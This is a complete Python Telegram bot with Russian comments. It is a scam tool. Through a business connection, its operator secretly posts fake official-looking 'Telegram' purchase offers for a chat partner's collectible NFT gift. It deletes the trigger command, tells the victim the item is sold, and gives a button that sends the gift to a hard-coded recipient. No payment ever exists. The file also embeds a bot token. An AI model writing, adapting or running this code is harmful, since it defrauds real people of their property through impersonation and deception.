import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.storage.memory import MemoryStorage

# Настройки
TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
RECIPIENT = "@recipient_username"  # Юзернейм, куда передается НФТ

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Очередь для отправки сообщений с защитой от флуда
message_queue = asyncio.Queue()

# Текст оффера (с превью карточки сверху для любого NFT)
def build_offer_text(sender_username, amount, gift_name, gift_num):
    slug = gift_name.replace(" ", "")
    return (
        f'<b><a href="https://t.me/nft/{slug}-{gift_num}">Telegram</a></b>\n'
        f'<b>{gift_name} #{gift_num}</b>\n\n'
        f'Пользователь <b>{sender_username}</b> предлагает Вам '
        f'<b>{amount} ⭐️</b> за коллекционный предмет '
        f'<b>{gift_name} #{gift_num}</b>.\n\n'
        f'Предложение действует еще 6 ч. 0 мин..'
    )

# Клавиатура оффера (Отклонить / Принять)
def make_offer_keyboard(sender_username, amount, currency, gift_name, gift_num, lang):
    cb_data = f"a|{sender_username}|{amount}|{currency}|{gift_name}|{gift_num}|{lang}"
    decline_data = f"d|{gift_num}"
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="❌ Отклонить", callback_data=decline_data),
                InlineKeyboardButton(text="✅ Принять", callback_data=cb_data)
            ]
        ]
    )

# Текст после принятия (инструкция)
def build_accept_text(gift_name, gift_num):
    slug = gift_name.replace(" ", "")
    return (
        f'<b><a href="https://t.me/nft/{slug}-{gift_num}">Telegram</a></b>\n'
        f'<b>{gift_name} #{gift_num}</b>\n\n'
        f'🎁 <b>Коллекционный предмет:\n'
        f'<a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a> успешно продан!</b>\n\n'
        f'• Передайте коллекционный предмет покупателю для зачисления Stars.'
    )

# Клавиатура после принятия (Передать НФТ / Подтвердить передачу)
def make_accept_keyboard():
    recipient = RECIPIENT.lstrip("@")
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=" ↗  Передать НФТ", url=f"tg://send_gift?to={recipient}")],
            [InlineKeyboardButton(text=" ⊙  Подтвердить передачу", callback_data="noop")],
        ]
    )

def unpack_offer(cb_data: str):
    try:
        parts = cb_data.split("|")
        if len(parts) >= 7:
            return parts[1], int(parts[2]), parts[3], parts[4], int(parts[5]), parts[6]
    except Exception:
        pass
    return None

# Быстрая команда прямо в чате: qq [ссылка] [сумма] [покупатель(необяз)]
@dp.message(F.text & F.text.startswith("qq"))
async def cmd_quick_offer(message: Message):
    parts = message.text.split()
    
    if len(parts) < 3:
        await message.reply(
            "❌ Неверный формат!\n"
            "Используй: <code>qq [ссылка_на_нфт] [сумма] [покупатель]</code>\n"
            "Пример: <code>qq https://t.me/nft/DurovsCap-123 500 cryptan</code>"
        )
        return

    nft_url = parts[1]
    amount_str = parts[2]
    sender_username = parts[3] if len(parts) > 3 else "cryptan"

    try:
        amount = int(amount_str)
    except ValueError:
        await message.reply("❌ Сумма должна быть числом!")
        return

    try:
        slug_part = nft_url.split("/nft/")[-1]
        if "-" in slug_part:
            gift_name_raw, gift_num_str = slug_part.rsplit("-", 1)
            gift_num = int(gift_num_str)
            gift_name = gift_name_raw
        else:
            await message.reply("❌ Неверный формат ссылки NFT (нет номера через дефис)")
            return
    except Exception as e:
        await message.reply(f"❌ Ошибка разбора ссылки NFT: {e}")
        return

    # Кладем в очередь отправки
    await message_queue.put((
        message.chat.id,
        sender_username,
        amount,
        "XTR",
        gift_name,
        gift_num,
        "ru",
        message.business_connection_id
    ))

    # Удаляем сообщение с командой qq
    try:
        if message.business_connection_id:
            await bot.delete_business_messages(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id]
            )
    except Exception:
        pass

@dp.callback_query(F.data.startswith("a|"))
async def accept_offer(cb: CallbackQuery):
    data = unpack_offer(cb.data)
    if not data:
        await cb.answer("Ошибка данных", show_alert=True)
        return

    sender_username, amount, currency, gift_name, gift_num, lang = data
    text = build_accept_text(gift_name, gift_num)
    bcid = cb.message.business_connection_id
    chat_id = cb.message.chat.id

    try:
        # 1. Удаляем сообщение с оффером
        await bot.delete_business_messages(
            business_connection_id=bcid,
            message_ids=[cb.message.message_id]
        )
        
        # 2. Присылаем новое сообщение с инструкцией и кнопкой передачи
        await bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=make_accept_keyboard(),
            business_connection_id=bcid,
            disable_web_page_preview=False,
        )
    except Exception as e:
        logging.error(f"accept replacement error: {e}")
        await cb.answer("Не удалось обработать", show_alert=True)
        return
        
    await cb.answer()

@dp.callback_query(F.data.startswith("d|"))
async def decline_offer(cb: CallbackQuery):
    try:
        await bot.delete_business_messages(
            business_connection_id=cb.message.business_connection_id,
            message_ids=[cb.message.message_id]
        )
    except Exception as e:
        logging.error(f"decline delete error: {e}")
    await cb.answer("Предложение отклонено")

@dp.callback_query(F.data == "noop")
async def noop_handler(cb: CallbackQuery):
    await cb.answer("Выполните передачу по кнопке выше", show_alert=False)

# Фоновый воркер для безопасной отправки офферов
async def sender_worker():
    while True:
        task = await message_queue.get()
        chat_id, sender_username, amount, currency, gift_name, gift_num, lang, bcid = task
        try:
            text = build_offer_text(sender_username, amount, gift_name, gift_num)
            keyboard = make_offer_keyboard(sender_username, amount, currency, gift_name, gift_num, lang)
            
            await bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=keyboard,
                business_connection_id=bcid,
                disable_web_page_preview=False,
            )
        except Exception as e:
            logging.error(f"worker error: {e}")
        finally:
            message_queue.task_done()
            await asyncio.sleep(1.5)

async def main():
    asyncio.create_task(sender_worker())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
    
